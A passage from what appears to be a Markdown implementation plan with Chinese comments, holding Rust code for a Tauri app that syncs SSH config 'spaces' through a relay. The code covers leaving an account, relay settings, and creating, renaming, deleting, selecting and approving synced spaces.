            let v1 = crypto::derive_keys(&words)?;
            let message = match relay.pull(&v1.chain_id, &v1.auth_token, 0) {
                Ok(_) => OLD_FORMAT_MESSAGE,
                Err(_) => NO_ACCOUNT_MESSAGE,
            };
            return Err(AppError::NotFound(message.to_string()));
        }
        Err(e) => return Err(e.into()),
    };
    let AccountMerged { mut section, markers, .. } = merge_account(&AccountState::new(&account_keys.chain_id), &account_keys, &pulled);
    if let Some(marker) = markers.first() {
        return Err(AppError::Other(format!(
            "this sync code was changed on {}; enter the new sync code",
            marker.by_device_name
        )));
    }
    env.keychain.set(MNEMONIC_ACCOUNT, &words)?;
    section.baseline_established = true;
    {
        let _doc = env.doc.lock().unwrap();
        install_account(env, section, account_keys, device_name, Vec::new())?;
    }
    env.events.wake();
    Ok(())
}

/// 離開帳戶時把這台的檔案(勾選的 space 檔;放棄 v1 升級時是 v1 的 `hosts.config`)改成一般的本機檔案(spec §7.3
/// 「本機 space 檔案與 Include 保留,ssh 照常可用;它們之後就是一般的本機檔案」):搬到 `~/.ssh/sshelter-local/`,主
/// config 裡我們的 token 原地換成新路徑 —— 一般的 Include,優先順序不變,之後建立或加入別的帳戶時 `ensure_include` 也
/// 不碰它們,搬移精靈看得到這些檔案。然後重載 doc。呼叫端持有 doc 鎖、不持有 core 鎖。失敗時什麼都沒變:新路徑已移除
/// (`space_files::keep_files_local`),doc 從磁碟重載(不會比磁碟新)。
fn keep_files_local(env: &SyncEnv, doc_lock: &mut Option<SshConfigDoc>, files: &[PathBuf]) -> Result<Vec<KeptFile>, AppError> {
    let main = match doc_lock.as_ref() {
        Some(doc) => doc.files[0].path.clone(),
        None => env.ssh_dir.join("config"),
    };
    if doc_lock.is_none() {
        *doc_lock = Some(env.load_doc(&main).map_err(kept_error)?);
    }
    let doc = doc_lock.as_mut().expect("loaded above");
    let mut backed_up = env.backed_up.lock().unwrap();
    let retention = env.retention();
    let result = space_files::keep_files_local(&env.ssh_dir, files, |kept| {
        let moved: Vec<(String, String)> = kept.iter().map(|k| (k.old_token.clone(), k.token.clone())).collect();
        if release_include(&mut doc.files[0].items, &moved) {
            persist_file(doc, 0, &mut backed_up, retention)?;
        }
        Ok(())
    });
    drop(backed_up);
    *doc_lock = env.load_doc(&main).ok();
    result.map_err(kept_error)
}

fn kept_error(e: AppError) -> AppError {
    AppError::Other(format!(
        "could not keep this device's synced files as local files ({e}); nothing was changed — try leaving again"
    ))
}

/// 離開帳戶(spec §7.3,這台)。這台的 space 檔先改成一般的本機檔案(`keep_files_local`;做不到就什麼都不改、回錯誤),
/// 同一段 doc 鎖內作廢在途輪次並清掉狀態的帳戶部分(確保停止同步、沒有輪次再碰這些檔案),再刪 keychain 的同步碼;刪不掉
/// 就持久化 `phrase_cleanup_pending`、回報錯誤(重試入口同 v1:未加入時再呼叫一次只做 keychain 清理)。檔案搬過的話留下
/// `SyncNotice::LeftAccount`(新的路徑)。`delete_remote`(這台是裝置清單上的最後一台時,spec §7.3「刪除帳戶」):先
/// `DELETE` 每個 space chain 與帳戶 chain(已經不在的略過),做不到就在改動任何東西之前回錯誤。v1 升級一直做不完時,
/// 離開 = 放棄升級,v1 的 `hosts.config` 一樣改成本機檔案。
pub fn leave_account(env: &SyncEnv, delete_remote: bool) -> Result<(), AppError> {
    let mut kept: Vec<KeptFile> = Vec::new();
    let abandon = {
        let core = env.runtime.core.lock().unwrap();
        core.save_blocked.is_none() && core.legacy.is_some()
    };
    if abandon {
        // v1 升級一直做不完(例如 keychain 裡沒有同步碼):離開 = 放棄升級,換成未加入的 v2 狀態。
        let mut doc_lock = env.doc.lock().unwrap();
        kept = match keep_files_local(env, &mut doc_lock, &[hosts_file::managed_path(&env.ssh_dir)]) {
            Ok(kept) => kept,
            Err(e) => {
                drop(doc_lock);
                env.events.applied(0);
                return Err(e);
            }
        };
        let mut core = env.runtime.core.lock().unwrap();
        if core.legacy.take().is_some() {
            core.generation += 1;
            save_core(&mut core, &env.state_path)?;
        }
    }
    saves_allowed(env)?;
    let (s, keys) = {
        let core = env.runtime.core.lock().unwrap();
        (core.state.clone().ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?, core.account_keys.clone())
    };
    if let Some(account) = s.account.as_ref() {
        if delete_remote {
            let keys = keys.ok_or_else(|| {
                AppError::Other(
                    "cannot delete the account from the relay: the sync code is not available on this device; leave without deleting"
                        .to_string(),
                )
            })?;
            let relay = env.relay(&s.relay_url)?;
            let gone = |r: Result<(), RelayError>| match r {
                Ok(()) | Err(RelayError::NotFound) => Ok(()),
                Err(e) => Err(AppError::from(e)),
            };
            for entry in space_entries(account).iter().filter(|e| !e.deleted) {
                if let Some(space) = space_keys(account, &keys, &entry.id) {
                    gone(relay.delete_chain(&space.chain_id, &space.auth_token))?;
                }
            }
            gone(relay.delete_chain(&keys.chain_id, &keys.auth_token))?;
        }
        let files = s
            .spaces
            .values()
            .filter(|sp| sp.selected)
            .map(|sp| space_files::space_file_path(&env.ssh_dir, &sp.file_name))
            .collect::<Result<Vec<_>, _>>()?;
        let mut doc_lock = env.doc.lock().unwrap();
        if !files.is_empty() {
            kept = match keep_files_local(env, &mut doc_lock, &files) {
                Ok(kept) => kept,
                Err(e) => {
                    drop(doc_lock);
                    env.events.applied(0);
                    return Err(e);
                }
            };
        }
        let mut core = env.runtime.core.lock().unwrap();
        core.generation += 1;
        core.account_keys = None;
        core.conflict_streak = 0;
        core.failed_rounds = 0;
        core.batch_failures = 0;
        if let Some(s) = core.state.as_mut() {
            s.account = None;
            s.spaces.clear();
            s.rotation = None;
            s.last_sync_ms = None;
            s.last_error = None;
        }
        // 寫檔失敗也不中止:沒有同步碼就推導不出金鑰,重啟也不會恢復同步;`unsaved` 讓下一輪補寫。
        let _ = save_core(&mut core, &env.state_path);
    }
    let notice = (!kept.is_empty()).then(|| SyncNotice::LeftAccount {
        kept_files: kept.iter().map(|k| k.path.to_string_lossy().into_owned()).collect(),
    });
    let _ = env.keychain.delete(NEXT_MNEMONIC_ACCOUNT);
    let cleared = env.keychain.delete(MNEMONIC_ACCOUNT);
    let saved = {
        let mut core = env.runtime.core.lock().unwrap();
        if let Some(s) = core.state.as_mut() {
            s.phrase_cleanup_pending = cleared.is_err();
            s.notices.extend(notice.clone());
        }
        save_core(&mut core, &env.state_path)
    };
    if let Some(notice) = &notice {
        env.events.notice(notice);
        env.events.applied(0);
    }
    env.events.wake();
    if let Err(e) = cleared {
        return Err(AppError::Other(format!(
            "left the sync account, but the sync code could not be removed from the keychain ({e}); use \"Remove sync code\" to retry"
        )));
    }
    if let Err(e) = saved {
        return Err(AppError::Other(format!(
            "left the sync account, but the sync state could not be saved ({e}); it will be retried automatically"
        )));
    }
    Ok(())
}

/// relay URL 只能在未加入時更改(spec §7.3:cursor 與 seq 屬於某一個 relay)。改了就要重查 `GET /v1/info`。
pub fn set_relay_url(env: &SyncEnv, url: &str) -> Result<(), AppError> {
    let normalized = RelayClient::validate_url(url)?;
    mutate(env, |s| {
        if s.joined() {
            return Err(AppError::Other(
                "leave the sync account before switching relays, then create or join on the new relay".to_string(),
            ));
        }
        s.relay_url = normalized;
        s.relay_features = None;
        s.last_error = None;
        Ok(())
    })?;
    env.runtime.core.lock().unwrap().relay_checked = None;
    env.events.wake();
    Ok(())
}

/// `GET /v1/info`(spec §6.4):結果與查的 URL 存進 `relay_features`。網路在鎖外。
pub fn check_relay(env: &SyncEnv) -> Result<RelayFeatures, AppError> {
    let url = snapshot(env).map(|s| s.relay_url).unwrap_or_default();
    relay_configured(&url)?;
    let info = env.relay(&url)?.info()?;
    let features = RelayFeatures::from_info(&url, &info, env.now());
    let mut core = env.runtime.core.lock().unwrap();
    // 查的期間 URL 被換掉(只可能在未加入時):結果屬於舊 URL,不存。
    if core.state.as_ref().is_some_and(|s| s.relay_url == url) {
        core.relay_checked = Some(url);
        if let Some(s) = core.state.as_mut() {
            s.relay_features = Some(features.clone());
        }
        if core.save_blocked.is_none() {
            let _ = save_core(&mut core, &env.state_path);
        }
    }
    Ok(features)
}

pub fn set_device_name(env: &SyncEnv, name: &str) -> Result<(), AppError> {
    let name = clean_device_name(name)?;
    let now = env.now();
    let platform = env.platform;
    mutate(env, |s| {
        s.device_name = name;
        let ids = selected_ids(s);
        let (device_id, device_name) = (s.device_id.clone(), s.device_name.clone());
        if let Some(account) = s.account.as_mut() {
            plan_device(account, &device_id, &device_name, platform, &ids, now);
        }
        Ok(())
    })?;
    env.events.wake();
    Ok(())
}

/// 只把裝置從清單移除(tombstone 它的 `device` 記錄)。**不是撤權**:它若還有同步碼就會繼續同步;要撤銷遺失的電腦
/// 請更換同步碼(spec §7.5)。
pub fn forget_device(env: &SyncEnv, device_id: &str) -> Result<(), AppError> {
    let now = env.now();
    mutate(env, |s| {
        if device_id == s.device_id {
            return Err(AppError::Other("use Leave to remove this device".to_string()));
        }
        let me = s.device_id.clone();
        let account = s.account.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
        let key = crate::sync::record::record_key(RecordKind::Device, device_id);
        let Some(local) = account.records.get(&key).filter(|l| !l.record.deleted).cloned() else {
            return Err(AppError::NotFound(format!("device {device_id} is not in this sync account")));
        };
        put_account_record(account, RecordKind::Device, device_id, local.record.payload, true, &me, now);
        Ok(())
    })?;
    env.events.wake();
    Ok(())
}

/// Sync pane 的「Show sync code」(spec §3)。keychain 讀取:呼叫端在 `spawn_blocking` 裡。
pub fn show_words(env: &SyncEnv) -> Result<String, AppError> {
    if !snapshot(env).is_some_and(|s| s.joined()) {
        return Err(AppError::Other(NOT_JOINED_MESSAGE.to_string()));
    }
    env.keychain.get(MNEMONIC_ACCOUNT)?.ok_or_else(|| AppError::Other("the sync code is not in the keychain".to_string()))
}
```

- [ ] **Step 10: 實作 `src-tauri/src/sync/spaces.rs`**

重點:每個結構變更都換 generation;刪除排進 `chain_deletes`、等 tombstone 上傳後才 `DELETE`;改名目標已存在 → 保留舊檔名,`rename_blocked` 換了目標才提示 `RenameBlocked`;核准在 doc 鎖內寫檔(`EngineWrite`),拒絕記 `declined`。

`src-tauri/src/sync/spaces.rs`:在 `use` 區之後、`#[cfg(test)]` 之前加入:

```rust
/// space 名稱的長度上限(字元)。檔名只用到 slug 的前 40 字元(spec §4.3)。
const MAX_SPACE_NAME: usize = 64;

/// space 名稱:去掉前後空白,不得為空、不得含控制字元、最長 64 字元。
pub fn clean_space_name(name: &str) -> Result<String, AppError> {
    let name = name.trim();
    if name.is_empty() {
        return Err(AppError::Other("space name cannot be empty".to_string()));
    }
    if name.chars().any(char::is_control) {
        return Err(AppError::Other("space name cannot contain control characters".to_string()));
    }
    if name.chars().count() > MAX_SPACE_NAME {
        return Err(AppError::Other(format!("space name can be at most {MAX_SPACE_NAME} characters")));
    }
    Ok(name.to_string())
}

/// 帳戶裡已有同名(不分大小寫)、未刪除的 space。UI 盡量避免重名,但不作為一致性保證(spec §4.1)。
fn name_taken(account: &AccountState, keys: &ChainKeys, name: &str, except: Option<&str>) -> bool {
    space_entries(account).iter().any(|e| {
        !e.deleted
            && space_deleted_by(account, keys, &e.id).is_none()
            && Some(e.id.as_str()) != except
            && e.name.to_lowercase() == name.to_lowercase()
    })
}

/// 已加入、可以改帳戶結構時的狀態快照與帳戶金鑰。
fn ready(env: &SyncEnv) -> Result<(SyncStateV2, ChainKeys), AppError> {
    let core = env.runtime.core.lock().unwrap();
    let s = core.state.clone().ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?;
    account_ready(&s, core.account_keys.as_ref())?;
    Ok((s, core.account_keys.clone().expect("checked by account_ready")))
}

fn unknown_space(space_id: &str) -> AppError {
    AppError::NotFound(format!("space {space_id} is not in this sync account"))
}

/// 帳戶裡還在的 space(`space` 與 `spacekey` 都沒有被刪除)。
fn live_entry(account: &AccountState, keys: &ChainKeys, space_id: &str) -> Result<crate::sync::merge::SpaceEntry, AppError> {
    space_entry(account, space_id)
        .filter(|e| !e.deleted && space_deleted_by(account, keys, space_id).is_none())
        .ok_or_else(|| unknown_space(space_id))
}

/// `<slug>-<id8>.config` 的 slug 部分。
fn file_slug(file_name: &str) -> &str {
    file_name.strip_suffix(".config").and_then(|stem| stem.rsplit_once('-')).map_or(file_name, |(slug, _)| slug)
}

/// `reconcile_space_files` 的結果。
#[derive(Debug, Default)]
pub struct Reconciled {
    /// 新增、刪除或改名了 space 檔:呼叫端整份重載 doc。
    pub touched: bool,
    /// 新的提示(已存進狀態;呼叫端放掉鎖之後發 `sync://notice`)。
    pub notices: Vec<SyncNotice>,
}

/// 依最新的帳戶記錄調整這台勾選的 space 檔(spec §4.3、§7.2):
/// 1. 帳戶已刪除(tombstone)的 space:先移出 Include、再備份並刪檔、刪掉它的狀態;別台刪的留下「已在 X 刪除」提示。
/// 2. 檔名與目前的 slug 不符(改名):hard link 建立新檔名 → Include 換成新名稱 → 刪舊名;新檔名已有檔案就什麼都
///    不改、保留舊檔名並提示(不覆蓋任何檔案)。
/// 3. 名稱改變影響 Include 的順序:換成新的順序。
///
/// 呼叫端持有 doc 與 backed_up 鎖、**不持有** core 鎖。
pub fn reconcile_space_files(
    env: &SyncEnv,
    doc: &mut SshConfigDoc,
    backed_up: &mut HashSet<PathBuf>,
    retention: Option<usize>,
) -> Result<Reconciled, AppError> {
    let mut out = Reconciled::default();
    let (account, spaces, me, keys) = {
        let core = env.runtime.core.lock().unwrap();
        match core.state.as_ref() {
            Some(s) => (s.account.clone(), s.spaces.clone(), s.device_id.clone(), core.account_keys.clone()),
            None => return Ok(out),
        }
    };
    let (Some(account), Some(keys)) = (account, keys) else { return Ok(out) };
    let tokens_without = |id: &str| -> Result<Vec<String>, AppError> {
        let core = env.runtime.core.lock().unwrap();
        let s = core.state.as_ref().ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?;
        let mut rest = s.spaces.clone();
        rest.remove(id);
        selected_include_tokens(s.account.as_ref(), &rest)
    };
    for (id, space) in &spaces {
        let Some(by) = space_deleted_by(&account, &keys, id) else { continue };
        let entry = space_entry(&account, id);
        let tokens = tokens_without(id)?;
        space_files::remove_space_file(&env.ssh_dir, &space.file_name, || write_include(doc, backed_up, retention, &tokens))?;
        let mut core = env.runtime.core.lock().unwrap();
        if let Some(s) = core.state.as_mut() {
            s.spaces.remove(id);
            if by != me {
                let name = entry.map(|e| e.name).filter(|n| !n.is_empty()).unwrap_or_else(|| "A space".to_string());
                let notice = SyncNotice::SpaceDeleted { name, by_device: device_name(&account, &by) };
                if !s.notices.contains(&notice) {
                    s.notices.push(notice.clone());
                    out.notices.push(notice);
                }
            }
        }
        save_core(&mut core, &env.state_path)?;
        out.touched = true;
    }
    let spaces = env.runtime.core.lock().unwrap().state.as_ref().map(|s| s.spaces.clone()).unwrap_or_default();
    for (id, space) in spaces.iter().filter(|(_, s)| s.selected) {
        let Some(entry) = space_entry(&account, id).filter(|e| !e.deleted) else { continue };
        if space_deleted_by(&account, &keys, id).is_some() {
            continue;
        }
        // 只有 slug 變了才改名:檔名裡的 id 可能屬於更換同步碼之前的 space(spec §7.5 保留檔名)。不必改名了(例如又改回
        // 原來的名稱)就清掉被擋下的記號。
        if file_slug(&space.file_name) == slugify(&entry.slug) {
            if space.rename_blocked.is_some() {
                let mut core = env.runtime.core.lock().unwrap();
                if let Some(sp) = core.state.as_mut().and_then(|s| s.spaces.get_mut(id)) {
                    sp.rename_blocked = None;
                }
                save_core(&mut core, &env.state_path)?;
            }
            continue;
        }
        let expected = space_file_name(&entry.slug, id)?;
        let tokens = {
            let core = env.runtime.core.lock().unwrap();
            let s = core.state.as_ref().ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?;
            let mut renamed = s.spaces.clone();
            if let Some(sp) = renamed.get_mut(id) {
                sp.file_name = expected.clone();
            }
            selected_include_tokens(s.account.as_ref(), &renamed)?
        };
        let outcome = space_files::rename_space_file(&env.ssh_dir, &space.file_name, &expected, || {
            write_include(doc, backed_up, retention, &tokens)
        })?;
        let mut core = env.runtime.core.lock().unwrap();
        let Some(s) = core.state.as_mut() else { continue };
        match outcome {
            RenameOutcome::Renamed => {
                if let Some(sp) = s.spaces.get_mut(id) {
                    sp.file_name = expected;
                    sp.rename_blocked = None;
                }
                out.touched = true;
            }
            RenameOutcome::TargetExists => {
                // 每一輪都會重試改名:同一個目標仍被擋時不再提示(使用者可能已經看過、關掉了),只在剛被擋下或目標換了
                // 的時候提示一次。
                let first = s.spaces.get_mut(id).is_some_and(|sp| {
                    let first = sp.rename_blocked.as_deref() != Some(expected.as_str());
                    sp.rename_blocked = Some(expected.clone());
                    first
                });
                let notice = SyncNotice::RenameBlocked { space_id: id.clone(), name: entry.name.clone(), file_name: expected };
                if first && !s.notices.contains(&notice) {
                    s.notices.push(notice.clone());
                    out.notices.push(notice);
                }
            }
            RenameOutcome::Unchanged => {}
        }
        save_core(&mut core, &env.state_path)?;
    }
    let tokens = {
        let core = env.runtime.core.lock().unwrap();
        let s = core.state.as_ref().ok_or_else(|| AppError::Other("sync is not initialized".to_string()))?;
        selected_include_tokens(s.account.as_ref(), &s.spaces)?
    };
    write_include(doc, backed_up, retention, &tokens)?;
    Ok(out)
}

/// 帳戶記錄改了之後在 doc 鎖內調整檔案,動了檔案就重載 doc。回傳新的提示。
fn reconcile_locked(env: &SyncEnv, doc_lock: &mut Option<SshConfigDoc>) -> Result<Reconciled, AppError> {
    let Some(doc) = doc_lock.as_mut() else { return Ok(Reconciled::default()) };
    let mut backed_up = env.backed_up.lock().unwrap();
    let reconciled = reconcile_space_files(env, doc, &mut backed_up, env.retention())?;
    drop(backed_up);
    if reconciled.touched {
        let main = doc.files[0].path.clone();
        *doc_lock = Some(env.load_doc(&main)?);
    }
    Ok(reconciled)
}

fn announce(env: &SyncEnv, reconciled: &Reconciled) {
    for notice in &reconciled.notices {
        env.events.notice(notice);
    }
    if reconciled.touched {
        env.events.applied(0);
    }
}

/// 建立 space(spec §7.2):產生 chain id、權杖、金鑰 → `PUT` 建 chain → 寫入 `space` 與 `spacekey` 記錄 → 建立者
/// 預設勾選(先建檔、再加進 Include;更新自己的 `device.spaces`)。回傳 space id。
pub fn create_space(env: &SyncEnv, name: &str) -> Result<String, AppError> {
    let name = clean_space_name(name)?;
    let (s, account_keys) = ready(env)?;
    let account = s.account.as_ref().expect("joined");
    if name_taken(account, &account_keys, &name, None) {
        return Err(AppError::Other(format!("a space named '{name}' already exists")));
    }
    let keys = ChainKeys::generate()?;
    env.relay(&s.relay_url)?.create_chain(&keys.chain_id, &keys.auth_token)?;
    let now = env.now();
    let payload = space_payload(&name, now, None);
    let file_name = space_file_name(&payload.slug, &keys.chain_id)?;
    {
        let mut doc_lock = env.doc.lock().unwrap();
        {
            let mut core = env.runtime.core.lock().unwrap();
            let s = core.state.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
            let me = s.device_id.clone();
            let account = s.account.as_mut().filter(|a| a.chain_id == account_keys.chain_id).ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
            put_new_space(account, &account_keys, &keys, &payload, &me, now)?;
            let mut space = SpaceState::new(&file_name);
            space.baseline_established = true; // 新的空 chain
            s.spaces.insert(keys.chain_id.clone(), space);
            let ids = selected_ids(s);
            let device = s.device_name.clone();
            plan_device(s.account.as_mut().expect("joined"), &me, &device, env.platform, &ids, now);
            core.generation += 1;
            save_core(&mut core, &env.state_path)?;
        }
        if let Err(e) = add_selected_file(env, &mut doc_lock, &file_name) {
            eprintln!("[sync] could not prepare the new space file ({e}); the next sync round retries");
        }
    }
    env.events.applied(0);
    env.events.wake();
    Ok(keys.chain_id)
}

/// 改名(spec §7.2):更新 `space` 記錄(名稱與 slug);這台若有勾選,依 §4.3 改名檔案並更新 Include。其他勾選的
/// 電腦收到記錄後在同步輪次裡做同樣的事。
pub fn rename_space(env: &SyncEnv, space_id: &str, name: &str) -> Result<(), AppError> {
    let name = clean_space_name(name)?;
    let (s, account_keys) = ready(env)?;
    let account = s.account.as_ref().expect("joined");
    let entry = live_entry(account, &account_keys, space_id)?;
    if entry.name == name {
        return Ok(());
    }
    if name_taken(account, &account_keys, &name, Some(space_id)) {
        return Err(AppError::Other(format!("a space named '{name}' already exists")));
    }
    let now = env.now();
    let reconciled = {
        let mut doc_lock = env.doc.lock().unwrap();
        {
            let mut core = env.runtime.core.lock().unwrap();
            let s = core.state.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
            let me = s.device_id.clone();
            let account = s.account.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
            let payload = space_payload(&name, entry.created_at_ms, entry.previous_id.clone());
            put_account_record(account, RecordKind::Space, space_id, serde_json::to_value(payload).expect("SpacePayload serializes"), false, &me, now);
            core.generation += 1;
            save_core(&mut core, &env.state_path)?;
        }
        reconcile_locked(env, &mut doc_lock)?
    };
    announce(env, &reconciled);
    env.events.wake();
    Ok(())
}

/// 刪除 space(spec §7.2,已確認):tombstone `space` 與 `spacekey` → 這台依 §4.3 移除 Include 與檔案(先備份)、刪掉
/// 它的狀態。chain 的 `DELETE` 排進 `chain_deletes`,等 tombstone 上傳之後由同步輪次執行 —— 別台先收到 tombstone,
/// 就不會看到「chain 不見了、帳戶卻還有這個 space」。
pub fn delete_space(env: &SyncEnv, space_id: &str) -> Result<(), AppError> {
    let (s, account_keys) = ready(env)?;
    let account = s.account.as_ref().expect("joined");
    let entry = live_entry(account, &account_keys, space_id)?;
    let now = env.now();
    let reconciled = {
        let mut doc_lock = env.doc.lock().unwrap();
        {
            let mut core = env.runtime.core.lock().unwrap();
            let s = core.state.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
            let me = s.device_id.clone();
            let device = s.device_name.clone();
            let ids: Vec<String> = selected_ids(s).into_iter().filter(|id| id != space_id).collect();
            let account = s.account.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
            if space_keys(account, &account_keys, space_id).is_some() {
                let sealed = account.sealed[&space_key_slot(&account_keys, space_id)].clone();
                account.chain_deletes.push(sealed);
            }
            let payload = space_payload(&entry.name, entry.created_at_ms, entry.previous_id.clone());
            put_account_record(account, RecordKind::Space, space_id, serde_json::to_value(payload).expect("SpacePayload serializes"), true, &me, now);
            put_space_key(account, &account_keys, space_id, None, &me, now)?;
            plan_device(account, &me, &device, env.platform, &ids, now);
            core.generation += 1;
            save_core(&mut core, &env.state_path)?;
        }
        reconcile_locked(env, &mut doc_lock)?
    };
    announce(env, &reconciled);
    env.events.wake();
    Ok(())
}

/// 勾選(spec §7.2):依 §4.3 建立空檔(已存在就保留內容)並加進 Include → 這個 space 以基線輪開始(chain 為準)→
/// 更新 `device.spaces`。
pub fn select_space(env: &SyncEnv, space_id: &str) -> Result<(), AppError> {
    let (s, account_keys) = ready(env)?;
    let account = s.account.as_ref().expect("joined");
    let entry = live_entry(account, &account_keys, space_id)?;
    if s.spaces.contains_key(space_id) {
        return Err(AppError::Other(format!("'{}' is already synced on this device", entry.name)));
    }
    if space_keys(account, &account_keys, space_id).is_none() {
        return Err(AppError::Other(format!("the key for '{}' has not arrived yet; sync and try again", entry.name)));
    }
    let file_name = space_file_name(&entry.slug, space_id)?;
    let now = env.now();
    {
        let mut doc_lock = env.doc.lock().unwrap();
        {
            let mut core = env.runtime.core.lock().unwrap();
            let s = core.state.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
            s.spaces.insert(space_id.to_string(), SpaceState::new(&file_name));
            let ids = selected_ids(s);
            let (me, device) = (s.device_id.clone(), s.device_name.clone());
            plan_device(s.account.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?, &me, &device, env.platform, &ids, now);
            core.generation += 1;
            save_core(&mut core, &env.state_path)?;
        }
        if let Err(e) = add_selected_file(env, &mut doc_lock, &file_name) {
            eprintln!("[sync] could not prepare the space file ({e}); the next sync round retries");
        }
    }
    env.events.applied(0);
    env.events.wake();
    Ok(())
}

/// 取消勾選(spec §7.2,已確認):依 §4.3 先移出 Include、再備份並刪檔,刪掉這個 space 的狀態(含還沒上傳的修改 ——
/// 檔案有備份),更新 `device.spaces`。relay 與其他電腦不受影響。檔案那一步失敗時狀態留在「取消勾選做到一半」
/// (`selected` = false),下一輪做完。
pub fn unselect_space(env: &SyncEnv, space_id: &str) -> Result<(), AppError> {
    let (s, _) = ready(env)?;
    let space = s.spaces.get(space_id).filter(|sp| sp.selected).ok_or_else(|| AppError::Other("this space is not synced on this device".to_string()))?;
    let now = env.now();
    {
        let mut doc_lock = env.doc.lock().unwrap();
        {
            let mut core = env.runtime.core.lock().unwrap();
            let s = core.state.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
            if let Some(sp) = s.spaces.get_mut(space_id) {
                sp.selected = false;
            }
            let ids = selected_ids(s);
            let (me, device) = (s.device_id.clone(), s.device_name.clone());
            plan_device(s.account.as_mut().ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?, &me, &device, env.platform, &ids, now);
            core.generation += 1;
            save_core(&mut core, &env.state_path)?;
        }
        if let Some(doc) = doc_lock.as_mut() {
            let tokens = {
                let core = env.runtime.core.lock().unwrap();
                let s = core.state.as_ref().expect("initialized");
                selected_include_tokens(s.account.as_ref(), &s.spaces)?
            };
            let mut backed_up = env.backed_up.lock().unwrap();
            let removed = space_files::remove_space_file(&env.ssh_dir, &space.file_name, || {
                write_include(doc, &mut backed_up, env.retention(), &tokens)
            });
            drop(backed_up);
            match removed {
                Ok(_) => {
                    let mut core = env.runtime.core.lock().unwrap();
                    if let Some(s) = core.state.as_mut() {
                        s.spaces.remove(space_id);
                    }
                    save_core(&mut core, &env.state_path)?;
                    let main = doc.files[0].path.clone();
                    *doc_lock = Some(env.load_doc(&main)?);
                }
                Err(e) => eprintln!("[sync] could not remove the space file yet ({e}); the next sync round finishes it"),
            }
        }
    }
    env.events.applied(0);
    env.events.wake();
    Ok(())
}

/// relay 上這個 space 的 chain 不見了、帳戶卻仍有它(spec §9):以同一組位置與權杖重新 `PUT`,把這台的內容全部重新
/// 上傳(cursor 歸零、每筆記錄以 seq 0 標 dirty)。`PUT` 成功不代表可寫:被凍結的 chain 刪除後仍是凍結的,之後的
/// push 會回 `409 frozen`,同步輪次照 §7.5 處理。
pub fn rebuild_space(env: &SyncEnv, space_id: &str) -> Result<(), AppError> {
    let (s, account_keys) = ready(env)?;
    if !s.spaces.get(space_id).is_some_and(|sp| sp.selected && sp.missing) {
        return Err(AppError::Other("this space is not missing on the relay".to_string()));
    }
    let account = s.account.as_ref().expect("joined");
    let keys = space_keys(account, &account_keys, space_id).ok_or_else(|| unknown_space(space_id))?;
    env.relay(&s.relay_url)?.create_chain(&keys.chain_id, &keys.auth_token)?;
    mutate(env, |s| {
        let sp = s.spaces.get_mut(space_id).ok_or_else(|| unknown_space(space_id))?;
        sp.missing = false;
        sp.last_error = None;
        sp.cursor_seq = 0;
        for local in sp.records.values_mut() {
            local.seq = 0;
            local.dirty = true;
        }
        Ok(())
    })?;
    env.events.wake();
    Ok(())
}

/// 核准(spec §7.4):套用等待核准的記錄 —— 寫進 space 檔、進快取(同一般遠端效果),從待核准清單移除。`aliases`
/// 全部都要在清單上,否則什麼都不做(「全部核准」= 傳入整個清單)。
pub fn approve(env: &SyncEnv, space_id: &str, aliases: &[String]) -> Result<usize, AppError> {
    let s = crate::sync::runtime::snapshot(env).ok_or_else(|| AppError::Other(NOT_JOINED_MESSAGE.to_string()))?;
    let space = s.spaces.get(space_id).filter(|sp| sp.selected).ok_or_else(|| AppError::Other("this space is not synced on this device".to_string()))?;
    let pending: Vec<_> = aliases
        .iter()
        .map(|a| space.pending_approvals.get(a).cloned().ok_or_else(|| AppError::NotFound(format!("'{a}' is not waiting for approval"))))
        .collect::<Result<_, _>>()?;
    let path = space_path(env, &space.file_name)?;
    let effects: Vec<HostEffect> = pending.iter().map(|p| HostEffect::Upsert { alias: p.record.id.clone(), text: p.text.clone() }).collect();
    {
        let mut doc_lock = env.doc.lock().unwrap();
        let doc = doc_lock.as_mut().ok_or_else(|| AppError::Other("no config loaded".to_string()))?;
        let stale = doc.files.iter().find(|f| f.path == path).is_none_or(|f| !memory_matches_disk(f));
        if stale {
            let main = doc.files[0].path.clone();
            *doc_lock = Some(env.load_doc(&main)?);
        }
        let doc = doc_lock.as_mut().expect("loaded");
        let idx = doc.files.iter().position(|f| f.path == path).ok_or_else(|| AppError::Other("the space file is not loaded".to_string()))?;
        check_managed_items(&doc.files[idx].items)?;
        let mut items = doc.files[idx].items.clone();
        let (changed, failed) = apply_effects_to_items(&mut items, &effects);
        if !failed.is_empty() {
            return Err(AppError::Other(format!("{} host(s) could not be applied; nothing was changed", failed.len())));
        }
        if changed {
            let original_newline = doc.files[idx].trailing_newline;
            doc.files[idx].trailing_newline = original_newline || doc.files[idx].items.is_empty();
            let original = std::mem::replace(&mut doc.files[idx].items, items);
            let mut backed_up = env.backed_up.lock().unwrap();
            let _engine = EngineWrite::begin();
            if let Err(e) = persist_file(doc, idx, &mut backed_up, env.retention()) {
                doc.files[idx].items = original;
                doc.files[idx].trailing_newline = original_newline;
                drop(backed_up);
                let main = doc.files[0].path.clone();
                *doc_lock = env.load_doc(&main).ok();
                return Err(e);
            }
        }
        let mut core = env.runtime.core.lock().unwrap();
        let sp = core.state.as_mut().and_then(|s| s.spaces.get_mut(space_id)).ok_or_else(|| unknown_space(space_id))?;
        for p in pending {
            sp.pending_approvals.remove(&p.record.id);
            sp.declined.remove(&p.record.id);
